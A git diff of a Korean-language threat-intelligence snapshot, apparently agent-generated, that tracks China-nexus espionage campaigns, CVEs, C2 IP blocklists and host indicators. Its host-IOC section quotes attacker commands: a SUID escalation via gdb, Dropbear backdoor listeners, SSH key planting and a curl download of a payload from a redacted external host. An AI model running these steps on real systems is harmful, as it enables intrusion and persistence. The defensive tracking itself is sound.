@@ -1,25 +1,25 @@
-# China State APT Campaign Snapshot — 2026-11-20 UTC
+# China State APT Campaign Snapshot — 2026-11-21 UTC
 
 ## 수집 상태
-- 페치 성공: [GTIG — Disrupting GRIDTIDE: A Global Espionage Campaign](https://cloud.google.com/blog/topics/threat-intelligence/disrupting-gridtide-global-espionage-campaign)(재확인, 공개 2026-02-25, 60일 창 밖으로 재확인되어 미채택 유지 — 과거 다수 실행에서 반복 확인된 사항과 동일); [Google Cloud Blog — Threat Intelligence 색인](https://cloud.google.com/blog/topics/threat-intelligence)(색인, 신규 China/PRC-nexus 게시물 없음, 2026-11-16 LEAKY CASTLE/CAIRN 이후 변동 없음); [Microsoft Security Blog 메인 색인](https://www.microsoft.com/en-us/security/blog/)(색인, 최신 게시물 2026-11-17 2건 모두 China 비관련)
-- 페치 차단(DNS 미해석/ENOTFOUND): blog.talosintelligence.com(UAT-11473/KeyDrift 원문 — 2회 시도), www.helpnetsecurity.com(Silent Train 재보도), cyberscoop.com(Silent Train 재보도), www.ampcuscyber.com(UAT-11473 재보도)
-- 검증된 IOC: 신규 0개(누적 도메인 35·IP 31·해시 61) / 미검증 IOC: 신규 0개(누적 도메인 0·IP 0) / 신규 CVE: 1건(미검증, CVE-2026-20127 — 누적 28, 검증 12/미검증 16)
+- 페치 성공: [GTIG — ARMORY CASTLE Exploits vSphere](https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-vsphere)(신규, 공개 2026-11-19); [Google Cloud Blog — Threat Intelligence 색인](https://cloud.google.com/blog/topics/threat-intelligence)(색인, 최근 11건 확인 — China/PRC-nexus 신규 게시물은 ARMORY CASTLE/vSphere뿐, COLD RELIC·XCPE Botnet은 비중국으로 확인 후 제외); [Microsoft Security Blog 메인 색인](https://www.microsoft.com/en-us/security/blog/)(색인, 최신 9건 모두 China 비관련)
+- 페치 차단(DNS 미해석/ENOTFOUND): www.ic3.gov(AA26-281A 원문 PDF), www.nextgov.com(Volt Typhoon "Silent Train" 재보도)
+- 검증된 IOC: 신규 11개(IP, 누적 도메인 35·IP 42·해시 61) / 미검증 IOC: 신규 0개(누적 도메인 0·IP 0) / 신규 CVE: 1건(검증, CVE-2026-123890 — 누적 29, 검증 13/미검증 16)
 
-6개 정기 WebSearch 쿼리와 추가 타겟 검색(Cisco Talos·Lumen Black Lotus Labs 원문 URL 특정, Google/Microsoft 블로그 신규 게시물 확인)을 수행했습니다. 대부분의 검색 결과는 기존 등재 그룹·캠페인(Volt/Salt/Silk/Flax Typhoon, APT31/40/41, Mustang Panda 등)의 재보도였습니다. 2026-10-28~29에 Cisco Talos와 Lumen Black Lotus Labs가 같은 날 공개한 두 건의 관련 보고서(UAT-11473/KeyDrift 멀웨어의 Cisco SD-WAN 익스플로잇, Volt Typhoon의 "Silent Train" 커버트 릴레이 네트워크)를 60일 창 내 신규 후보로 식별했으나, 원문(blog.talosintelligence.com) 및 모든 재보도 매체(helpnetsecurity.com, cyberscoop.com, ampcuscyber.com 등)가 DNS 미해석으로 차단되어 검색 스니펫 종합만으로 미검증 반영했습니다. CVE-2026-20127(Cisco Catalyst SD-WAN Controller 인증 우회)을 미검증 CVE로 신규 추가했으며, 구체적 C2 도메인·IP·해시는 재보도에 제시되지 않아 반영하지 않았습니다.
+6개 정기 WebSearch 쿼리와 추가 타겟 검색(SecurityScorecard/Volt Typhoon 과거 보고서 재확인, Positive Technologies/APT31-러시아 캠페인, AA26-281A 상세, Mandiant/APT41 사례 날짜 확인, GTIG·Microsoft 블로그 신규 게시물 확인)을 수행했습니다. GTIG 블로그 색인에서 2026-11-19 공개된 신규 포스트 "ARMORY CASTLE Exploits vSphere"를 식별·페치해 전문을 확보했습니다 — 기존에 이미 등재된 PRC-nexus 행위자 ARMORY CASTLE(구 UNC5221)이 BeyondTrust Remote Support 제로데이(CVE-2026-102764, 2026-10-15 공개) 경유 침투 후 내부 Linux 어플라이언스로 측면이동해 VMware vCenter 제로데이 CVE-2026-123890(인증 없는 SRP-6a 세션키 노출→administrator@vsphere.local 인증우회, DCE/RPC 2012포트)을 신규로 익스플로잇한 사실과 7종의 신규 툴셋, "Suspected Obfuscation Network"로 서술된 압수된 제3자 방화벽·라우터 IP 11건을 확인해 전부 검증 IOC로 반영했습니다. 같은 색인에서 신규 포스트 2건(COLD RELIC, XCPE Botnet)을 추가로 확인했으나, COLD RELIC은 원문이 러시아 FSB 연계(COLDRIVER/UNC4057)로 명시하고 있어 제외했고, XCPE Botnet은 중국 소재 OEM 업체 Videostrong Technology가 운영한 금전적 동기의 광고사기·레지덴셜프록시 봇넷으로 서술되어(국가 배후 첩보 활동 기준 미충족) 제외했습니다.
 
-GTIG GRIDTIDE/UNC2814 원문(2026-02-25 공개)을 재확인했으나 과거 실행에서 반복 확인된 바와 같이 60일 창을 크게 벗어나 재채택하지 않았습니다(그룹·IOC 불변, 참고용 유지).
+AA26-281A(FBI/CISA/NSA/NCSC-UK 공동권고, 2026-10-08 공개)의 정식 명칭과 "Flax Typhoon과 기술적으로 일치"라는 서술을 재보도로 추가 확인했으나, 1차 출처(ic3.gov, cyber.gov.au) 전량 EGRESS_BLOCKED로 미검증 유지한 채 기존 Integrity Technology Group 행 메타데이터만 보강했습니다. Volt Typhoon "Silent Train"(nextgov.com 재보도)·SecurityScorecard의 과거(2024) New Caledonia VPN 브릿지 보고서·Positive Technologies의 APT31-러시아 IT섹터 캠페인(2024~2025 활동, 2025-11 공개로 60일 창 밖)·Mandiant APT41 선적/물류 캠페인(2024-07 공개, 60일 창 밖)은 모두 신규 반영 기준 미충족으로 미채택했습니다.
 
-60일 창이 2026-09-21~로 이동했습니다. 기존 11건 캠페인 모두 창 내에 유지(가장 이른 Red Heron 공개 2026-09-22, Phantom Taurus 2026-09). 금일 신규 캠페인 1건(UAT-11473/KeyDrift) 추가로 총 12건. 7일 창(2026-11-13~2026-11-20) 기준 LEAKY CASTLE/CAIRN(11-16)만 🔥 유지, UAT-11473(10-28)은 7일 창 밖.
+60일 창이 2026-09-22~로 이동했습니다. 기존 12건 캠페인 모두 창 내 유지. 금일 신규 캠페인 1건(ARMORY CASTLE/vCenter CVE-2026-123890) 추가로 총 13건. 7일 창(2026-11-14~2026-11-21) 기준 LEAKY CASTLE/CAIRN(11-16)·ARMORY CASTLE/vCenter(11-19) 2건 🔥.
 
 ## 최근 캠페인 (최근 60일)
 
-### UAT-11473(KeyDrift) — Cisco SD-WAN 제로데이, Volt Typhoon "Silent Train" 인프라 중첩 ⚠️ (미검증)
-- 귀속: 귀속 미확인 — Talos 원문(재보도 종합)은 UAT-11473 자체에 국가 귀속 표현을 직접 사용하지 않음. "infrastructure overlaps considerably with Volt Typhoon's 'Silent Train'"로만 서술하며 두 행위자를 동일시하지 않음(재보도 종합, 원문 미확보). PLA/MSS 언급 없음. 참고: Volt Typhoon 자체는 기존 등재 기준상 "China-nexus"(GTIG, 검증, 그룹 표 참조)
-- 대상: 우주·위성 서비스, 국방·항공우주 기술, 정책 연구기관(피해 국가·조직명 재보도에 미기재)
-- 초기 침투: CVE-2026-20127(Cisco Catalyst SD-WAN Controller, vSmart/vBond 인증 우회, CVSS 10.0)
-- 주요 도구/멀웨어: KeyDrift 프레임워크 — PolyFlame(메모리 상주 모듈, `libdssl.so`, 컨트롤러 프로세스 내부 실행), LittleFilch(OpenSSL `SSL_read` 후킹을 통한 AES-256 키 자재 추출 모듈)
-- 관측 시점: 활동은 "historical"로만 서술(정확한 기간 미기재), 공개 2026-10-28(Cisco Talos)
-- 출처: 검색 결과만 확인 — Cisco Talos(blog.talosintelligence.com, ENOTFOUND로 2회 차단), 재보도(esecurityplanet.com, securityonline.info, neoteo.com, ampcuscyber.com 등, 일부 ENOTFOUND)
+### ARMORY CASTLE(구 UNC5221) — VMware vCenter 제로데이(CVE-2026-123890) 추가 익스플로잇, SLIMSAVAGE·BONESAW·LAZYBONES 등 신규 툴셋 🔥
+- 귀속: 귀속 미확인 — 원문 인용: "ARMORY CASTLE, a suspected PRC-nexus espionage threat actor (formerly tracked as UNC5221)" (GTIG, 검증). PLA/MSS 명시 없음. 함께 언급된 UNC6201(BRICKSTORM 관련 TTP 공유)도 "suspected PRC-nexus actor"로만 서술.
+- 대상: 불명 — 원문은 "a high-priority environment"로만 서술, 구체 산업·국가 미기재
+- 초기 침투: BeyondTrust Remote Support(구 Bomgar) 제로데이 CVE-2026-102764(기존 2026-10-15 공개) 경유 침투 → 내부 Linux 어플라이언스로 측면이동 → VMware vCenter 제로데이 CVE-2026-123890(인증 없는 SRP-6a 세션키 노출, DCE/RPC 2012포트, administrator@vsphere.local 인증우회) 추가 익스플로잇
+- 주요 도구/멀웨어: SLIMSAVAGE(JSP 웹셸 `ActiveSer.jsp`, 암호 `pwd=123`), CAGEMATCH(JSP 파일스테이징 웹셸 `u.jsp`), BEARBONES(백도어 Dropbear SSH `/tmp/dbr`, 평문 자격증명 로깅, 배너 `SSH-2.0-pulsesecure_23345`, TCP 53·33992 리슨), BONESAW(Go 익스플로잇 유틸 `/tmp/123`, CVE-2026-123890 익스플로잇), SAWSNAKE(Go SAML 유틸 `/tmp/sss`, Golden SAML 위조), LAZYBONES(Go 백도어 `/usr/bin/vmtoolscs`, Slack API C2, systemd 서비스 50분 주기 재시작·150~450초 지터), vmfs_browser.py(VMFS 볼륨 추출 파이썬 툴, `vmfs-pydist.tar.gz`). 보조 툴: nmap, curl, RAR, WinSCP, gdb
+- 관측 시점: BONESAW 실행 2026년 9월 초(CVE-2026-123890 익스플로잇 시점), BONESAW Go 빌드 타임스탬프 2026-07-13T09:21:24Z(변조 가능성 있음), CVE-2026-123890 공개 2026-11-19(VMware·GTIG 동시 공개)
+- 출처: [GTIG](https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-vsphere) — 2026-11-19 — fetched(금일)
 
 ### LEAKY CASTLE(PRC 계약업체) 및 CAIRN 프레임워크 — AI/LLM 기반 사이버첩보 활동, 미 항공우주 섹터 표적 🔥
 - 귀속: 귀속 미확인 — 원문 인용: "a PRC contractor"(LEAKY CASTLE, GTIG, 검증) / "suspected espionage threat actors with a PRC nexus"·"PRC-nexus cyber espionage actors used LLM tools and models for reconnaissance, front-end scanning, researching targets across various sectors and geographies, and weaponizing exploits"(GTIG, 검증, 2026-11-16). PLA/MSS 명시 없음.
@@ -45,13 +45,21 @@ GTIG GRIDTIDE/UNC2814 원문(2026-02-25 공개)을 재확인했으나 과거 실
 - 관측 시점: 제로데이 익스플로잇 2026년 8월 말, 2026-10-15 공개
 - 출처: [GTIG](https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-beyondtrust) — 2026-10-15 — fetched(이전 실행)
 
-### Integrity Technology Group 연계 — 동남아 정부기관 메일함 대량 복제 및 MicroScan/FishHub 글로벌 봇넷·피싱 인프라 ⚠️ (미검증)
-- 귀속: 귀속 미확인 — 1차 출처(FBI/파트너국 공동권고, DOJ 보도자료) 미확보, 재보도만 확인. Integrity Technology Group은 과거 미 재무부(OFAC)가 Flax Typhoon 인프라 제공 혐의로 제재한 중국 기업. PLA/MSS로 승격하지 않음.
-- 대상: 동남아시아 정부기관·법집행기관·의료기관·종교단체 M365/Exchange 계정
+### Integrity Technology Group 연계(AA26-281A) — 동남아 정부기관 메일함 대량 복제 및 MicroScan/FishHub 글로벌 봇넷·피싱 인프라 ⚠️ (미검증)
+- 귀속: 귀속 미확인 — 1차 출처(AA26-281A, FBI/CISA/NSA/NCSC-UK 공동권고, ic3.gov·cyber.gov.au 전량 EGRESS_BLOCKED로 미확보) 미확보, 재보도만 확인. Integrity Technology Group은 과거 미 재무부(OFAC)가 Flax Typhoon 인프라 제공 혐의로 제재한 중국 기업. 재보도: "actors supported by Integrity Tech use techniques consistent with activity tracked as Flax Typhoon", "a China-based for-profit company with links to the Chinese government"(재보도 종합, 미검증). PLA/MSS로 승격하지 않음.
+- 대상: 동남아시아 정부기관·법집행기관·의료기관·종교단체 M365/Exchange 계정; 미국 사우스캐롤라이나 전력회사, 일본·폴란드 공항, 대만 가스전력 부문도 피해 대상 거론(재보도, 미검증)
 - 초기 침투: 웹 취약점 스캐닝 및 패스워드 스프레이 추정
 - 주요 도구/멀웨어: MicroScan(IoT 봇넷 기반 스캐너, 미검증), FishHub(피싱 인프라, 미검증)
-- 관측 시점: 공동권고 공개 2026-10-08
-- 출처: 검색 결과만 확인 — FBI 등 공동권고(1차 출처 미확보), 재보도(전량 EGRESS_BLOCKED)
+- 관측 시점: 공동권고(AA26-281A) 공개 2026-10-08
+- 출처: 검색 결과만 확인 — AA26-281A(1차 출처 미확보), 재보도(전량 EGRESS_BLOCKED)
+
+### UAT-11473(KeyDrift) — Cisco SD-WAN 제로데이, Volt Typhoon "Silent Train" 인프라 중첩 ⚠️ (미검증)
+- 귀속: 귀속 미확인 — Talos 원문(재보도 종합)은 UAT-11473 자체에 국가 귀속 표현을 직접 사용하지 않음. "infrastructure overlaps considerably with Volt Typhoon's 'Silent Train'"로만 서술하며 두 행위자를 동일시하지 않음(재보도 종합, 원문 미확보). PLA/MSS 언급 없음.
+- 대상: 우주·위성 서비스, 국방·항공우주 기술, 정책 연구기관(피해 국가·조직명 재보도에 미기재)
+- 초기 침투: CVE-2026-20127(Cisco Catalyst SD-WAN Controller, vSmart/vBond 인증 우회, CVSS 10.0)
+- 주요 도구/멀웨어: KeyDrift 프레임워크 — PolyFlame(메모리 상주 모듈, `libdssl.so`), LittleFilch(OpenSSL `SSL_read` 후킹 AES-256 키 자재 추출 모듈)
+- 관측 시점: 활동은 "historical"로만 서술, 공개 2026-10-28(Cisco Talos)
+- 출처: 검색 결과만 확인 — Cisco Talos(차단), 재보도(일부 차단)
 
 ### UAT-11587 (Antino 백도어) — 아시아 8개국 정부·정책·시민사회 기관 대상 재부상 캠페인 ⚠️ (미검증)
 - 귀속: 귀속 미확인 — "Talos assesses the actor as China-nexus with high confidence"(재보도 종합, 원문 미검증)
@@ -110,33 +118,48 @@ GTIG GRIDTIDE/UNC2814 원문(2026-02-25 공개)을 재확인했으나 과거 실
 - 출처: 검색 결과만 확인 — CrowdStrike(DNS 미해석), 재보도(다수)
 
 ## 그룹 별칭 매핑
-전체 누적 그룹 목록(마지막 관측일 포함)은 [`groups.md`](../groups.md) 참조. 금일 신규 그룹 1건 추가: UAT-11473(미검증).
+전체 누적 그룹 목록(마지막 관측일 포함)은 [`groups.md`](../groups.md) 참조. 금일 신규 그룹 없음 — ARMORY CASTLE(구 UNC5221) 행 갱신(신규 캠페인·CVE·IP·마지막 관측일 2026-11-19), Integrity Technology Group 행 보강(AA26-281A 정식 명칭·Flax Typhoon 연계 서술 추가, 미검증 유지).
 
 ## 악용 CVE (패치 우선순위)
-신규 미검증 CVE 1건: CVE-2026-20127 — Cisco Catalyst SD-WAN Controller(인증 우회), UAT-11473(미검증)/Volt Typhoon 인프라 중첩, 2026-10-28. 전체 누적 목록은 [`exploited-cves.txt`](../exploited-cves.txt) 참조(28건, 검증 12 / 미검증 16).
+신규 검증 CVE 1건: CVE-2026-123890 — VMware vCenter Server(인증 없는 SRP-6a 세션키 노출, 인증우회), ARMORY CASTLE(구 UNC5221), 2026-11-19(GTIG, 검증). 전체 누적 목록은 [`exploited-cves.txt`](../exploited-cves.txt) 참조(29건, 검증 13 / 미검증 16).
 
 ## C2 도메인 (35, 누적)
 신규 없음. 전체 목록은 [`blocklists/domains.txt`](../blocklists/domains.txt) 참조.
 
-## C2 IP (31, 누적)
-신규 없음. 전체 목록은 [`blocklists/ips.txt`](../blocklists/ips.txt) 참조.
+## C2 IP (42, 누적)
+신규 11건 — ARMORY CASTLE/vCenter 캠페인(GTIG, 2026-11-19, "Suspected Obfuscation Network"로 서술된 압수된 제3자 방화벽·라우터, BEARBONES 배너 노출):
+- 103.147.251.5, 103.190.38.3, 118.174.128.34, 118.174.128.36, 118.174.128.38, 176.9.89.66, 185.71.15.109, 220.121.128.41, 222.108.77.44, 61.216.56.127, 81.45.89.43
+
+전체 목록은 [`blocklists/ips.txt`](../blocklists/ips.txt) 참조.
 
 ## 파일 해시 (61, 누적)
-신규 없음. 기존 61건은 이전 스냅샷([`snapshots/2026-08-27.md`](2026-08-27.md), [`snapshots/2026-08-28.md`](2026-08-28.md), [`snapshots/2026-09-03.md`](2026-09-03.md), [`snapshots/2026-09-07.md`](2026-09-07.md), [`snapshots/2026-09-25.md`](2026-09-25.md), [`snapshots/2026-10-01.md`](2026-10-01.md), [`snapshots/2026-10-16.md`](2026-10-16.md)) 참조.
+신규 없음. ARMORY CASTLE/vCenter 캠페인(2026-11-19)의 해시는 원문 본문에 미게시(VirusTotal GTI 컬렉션 링크만 제공, 로그인 필요)되어 반영하지 않음. 기존 61건은 이전 스냅샷([`snapshots/2026-08-27.md`](2026-08-27.md), [`snapshots/2026-08-28.md`](2026-08-28.md), [`snapshots/2026-09-03.md`](2026-09-03.md), [`snapshots/2026-09-07.md`](2026-09-07.md), [`snapshots/2026-09-25.md`](2026-09-25.md), [`snapshots/2026-10-01.md`](2026-10-01.md), [`snapshots/2026-10-16.md`](2026-10-16.md)) 참조.
 
 ## 호스트 IOC · LOTL 아티팩트
-신규 없음. 기존 항목은 [`snapshots/2026-09-07.md`](2026-09-07.md), [`snapshots/2026-10-16.md`](2026-10-16.md), [`snapshots/2026-11-03.md`](2026-11-03.md) 참조.
+신규 — ARMORY CASTLE/vCenter 캠페인(GTIG, 2026-11-19, 검증):
+- `gdb`로 `/bin/env`에 SUID 비트 설정 → 임의 사용자 root 실행
+- BEARBONES 백도어 리스너: TCP 53, TCP 33992
+- vCenter에 로컬 관리자 계정 `sps-<REDACTED>@vsphere.local` 생성
+- BONESAW가 `vmdir` 경유 SSO admin 계정 및 백도어 머신 계정 생성
+- `PUT /rest/appliance/access/ssh`로 SSH 활성화 → 자격증명 탈취 후 비활성화
+- ESXi root `authorized_keys`에 SSH 공개키 추가, 개인키는 `/tmp/123.key`에 스테이징
+- VMFS 볼륨에 숨김 디렉터리 `.a` 생성
+- LAZYBONES systemd 서비스, 50분 주기 재시작·150~450초 지터
+- SAWSNAKE 및 실행 결과물을 `rm`으로 삭제(안티포렌식)
+- 주요 명령: `/tmp/dbr -R -p 53`, `/tmp/dbr -R -p 33992`, `curl -o /tmp/123.rar -k https://<REDACTED>/content/r.js`
+
+기존 항목은 [`snapshots/2026-09-07.md`](2026-09-07.md), [`snapshots/2026-10-16.md`](2026-10-16.md), [`snapshots/2026-11-03.md`](2026-11-03.md) 참조.
 
 ## 이번 실행 변경사항
-- 신규 캠페인: UAT-11473(KeyDrift) — Cisco SD-WAN 제로데이, Volt Typhoon "Silent Train" 인프라 중첩(미검증) 1건
-- 신규 IOC: 없음(해당 캠페인 재보도에 도메인/IP/해시 미게시)
-- 신규 CVE: CVE-2026-20127(미검증) 1건
+- 신규 캠페인: ARMORY CASTLE(구 UNC5221) — VMware vCenter 제로데이(CVE-2026-123890) 추가 익스플로잇(검증) 1건
+- 신규 IOC: IP 11건(검증, ARMORY CASTLE/vCenter 캠페인)
+- 신규 CVE: CVE-2026-123890(검증) 1건
 - 제거: 없음
-- 캠페인 목록 변동: 11건 → 12건(신규 1건 추가, 기존 11건 전부 60일 창 내 유지)
+- 캠페인 목록 변동: 12건 → 13건(신규 1건 추가, 기존 12건 전부 60일 창 내 유지)
 - 승격(미검증→검증): 없음
 - 귀속 변경: 없음
-- 신규 그룹(표 등재): UAT-11473(미검증)
-- 비고: WebFetch 총 8건 시도(성공 3 — GRIDTIDE 원문 재확인, GTIG 블로그 목록, Microsoft 블로그 목록 / 실패 5 — blog.talosintelligence.com 2회, helpnetsecurity.com, cyberscoop.com, ampcuscyber.com 모두 DNS 미해석). UAT-11473/KeyDrift 및 Volt Typhoon "Silent Train"(Lumen Black Lotus Labs) 양쪽 모두 1차 출처 및 모든 대체 재보도 매체가 차단되어 검색 스니펫 종합으로만 미검증 반영. GRIDTIDE/UNC2814(2026-02-25 공개)는 과거 다수 실행에서 반복 확인된 바와 같이 60일 창을 크게 벗어나 재채택하지 않음(참고용 유지, 그룹·IOC 불변).
+- 그룹 메타데이터 갱신: ARMORY CASTLE(마지막 관측 2026-10-15→2026-11-19), Integrity Technology Group(AA26-281A 정식 명칭·Flax Typhoon 연계 서술 보강, 미검증 유지)
+- 비고: WebFetch 총 4건 시도(성공 2 — GTIG 블로그 색인, Microsoft 블로그 색인 / 추가 성공 1 — ARMORY CASTLE/vSphere 원문 / 실패 2 — ic3.gov, nextgov.com 모두 DNS 미해석). GTIG 블로그 색인에서 발견한 COLD RELIC(러시아 FSB 연계)·XCPE Botnet(China 소재 OEM의 금전적 동기 봇넷)은 국가 배후 첩보 활동 기준 미충족으로 미채택. AA26-281A 1차 출처(ic3.gov, cyber.gov.au)는 계속 EGRESS_BLOCKED로 미검증 유지.
 
 ## 차단 운영 포맷 (복붙용)
 
@@ -183,10 +206,15 @@ www.twisinbeth.com
 ```
 101.100.182.122
 103.13.28.40
+103.147.251.5
+103.190.38.3
 103.27.110.83
 103.73.66.37
 103.79.120.72
 116.88.34.184
+118.174.128.34
+118.174.128.36
+118.174.128.38
 118.189.188.122
 129.126.109.50
 130.94.6.228
@@ -195,6 +223,8 @@ www.twisinbeth.com
 144.172.64.99
 158.140.135.244
 166.88.2.90
+176.9.89.66
+185.71.15.109
 187.15.88.186
 187.15.89.186
 187.15.90.217
@@ -202,6 +232,8 @@ www.twisinbeth.com
 195.123.211.70
 202.59.10.122
 206.188.196.199
+220.121.128.41
+222.108.77.44
 223.25.78.136
 23.169.65.49
 38.180.205.14
@@ -209,19 +241,21 @@ www.twisinbeth.com
 38.60.171.242
 38.60.194.21
 45.77.39.28
+61.216.56.127
 8.218.240.85
 8.222.225.8
+81.45.89.43
 98.142.138.21
 ```
 
 ## 출처
-- [Inside KeyDrift: Analyzing historical UAT-11473 activity on Cisco SD-WAN](https://blog.talosintelligence.com/) — Cisco Talos — 2026-10-28 — blocked(ENOTFOUND, 재보도 종합으로 미검증 반영)
-- [Volt Typhoon targeted enterprise control planes via ever-changing "Silent Train" relay network](https://www.helpnetsecurity.com/2026/10/29/volt-typhoon-silent-train-relay-network/) — Lumen Black Lotus Labs(재인용, Help Net Security) — 2026-10-29 — blocked(ENOTFOUND)
+- [ARMORY CASTLE Exploits vSphere](https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-vsphere) — Google GTIG — 2026-11-19 — fetched(금일)
 - [GTIG AI Threat Tracker: Agentic Threat Activity Crosses a Significant Threshold](https://cloud.google.com/blog/topics/threat-intelligence/agentic-threat-activity-crosses-a-significant-threshold) — Google GTIG — 2026-11-16 — fetched(이전 실행)
 - [ARTEX and Friends: Enter Agentic Offensive Frameworks](https://cloud.google.com/blog/topics/threat-intelligence/artex-and-friends-enter-agentic-offensive-frameworks) — Google GTIG/Mandiant — 2026-10-30 — fetched(이전 실행)
 - [AI-driven, large-scale nation-state campaign using ARTEX enables supply chain compromise](https://www.microsoft.com/en-us/security/blog/2026/10/21/storm-0940-uses-artex-agentic-ai-connectwise-supply-chain-compromise/) — Microsoft — 2026-10-21 — fetched(이전 실행)
 - [ARMORY CASTLE Exploits BeyondTrust](https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-beyondtrust) — Google GTIG — 2026-10-15 — fetched(이전 실행)
 - [NeedyMantis: Unpacking a post-compromise malware family used in targeted operations](https://www.microsoft.com/en-us/security/blog/2026/09/28/needymantis-unpacking-a-post-compromise-malware-family-used-in-targeted-operations/) — Microsoft — 2026-09-28 — fetched(이전 실행)
-- [Disrupting GRIDTIDE: A Global Espionage Campaign](https://cloud.google.com/blog/topics/threat-intelligence/disrupting-gridtide-global-espionage-campaign) — Google GTIG — 2026-02-25 — fetched(재확인, 60일 창 밖으로 미채택)
-- [Microsoft Security Blog 메인 색인](https://www.microsoft.com/en-us/security/blog/) — Microsoft — 2026-11-20 조회 — fetched(색인, 신규 China/PRC-nexus 게시물 없음)
-- [Google Cloud Blog — Threat Intelligence 색인](https://cloud.google.com/blog/topics/threat-intelligence) — Google GTIG — 2026-11-20 조회 — fetched(색인, 신규 China/PRC-nexus 게시물 없음)
+- [Chinese Government-linked Cyber Threat Actors Combine Automated and Hands-on Hacking Tools to Steal Sensitive Data (AA26-281A)](https://www.cisa.gov/) — FBI/CISA/NSA/NCSC-UK — 2026-10-08 — blocked(ic3.gov ENOTFOUND, cyber.gov.au EGRESS_BLOCKED, 재보도 종합으로만 반영)
+- [China's Volt Typhoon quietly built another hacking network following US crackdown](https://www.nextgov.com/) — Nextgov (Lumen Black Lotus Labs 재인용) — 2026-10 — blocked(ENOTFOUND)
+- [Google Cloud Blog — Threat Intelligence 색인](https://cloud.google.com/blog/topics/threat-intelligence) — Google GTIG — 2026-11-21 조회 — fetched(색인)
+- [Microsoft Security Blog 메인 색인](https://www.microsoft.com/en-us/security/blog/) — Microsoft — 2026-11-21 조회 — fetched(색인, 신규 China/PRC-nexus 게시물 없음)
